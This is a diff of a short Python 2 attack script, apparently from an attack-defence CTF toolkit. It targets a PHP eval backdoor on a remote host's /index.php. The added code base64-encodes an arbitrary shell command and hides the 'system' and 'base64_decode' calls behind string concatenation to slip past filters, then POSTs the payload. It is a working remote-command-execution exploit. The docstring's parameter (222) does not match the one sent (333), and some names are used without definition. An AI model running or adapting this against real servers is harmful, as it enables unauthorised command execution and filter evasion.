@@ -3,22 +3,24 @@
 from framework.http import http
 from framework.config import *
 from framework.function import *
-import urllib
+from urllib import quote
 import traceback
-from replay import *
 
 def vulnerable_attack(target,target_port,cmd):
 	
     '''
     this is the payload script for vuln:
 
-    include "php://input";
+    eval($_POST[222]);
 
     '''
     
     try:	   
-	cmd = urllib.unquote(cmd)
-	sequence_attack(target,target_port,cmd,'test',4)	 
+	cmd = base64.b64encode(cmd)
+	payload = "('sy'.'stem')(('bas'.'e64_'.'decode')('%s'))==0"%cmd
+        print payload
+        data = '333=%s'% quote(payload) 
+	res = http("post",target,target_port,"/index.php",data,headers)
     except Exception,e:
 	debug_print(traceback.format_exc())	
 	dump_error(target,"attack failed","sample.py attack")
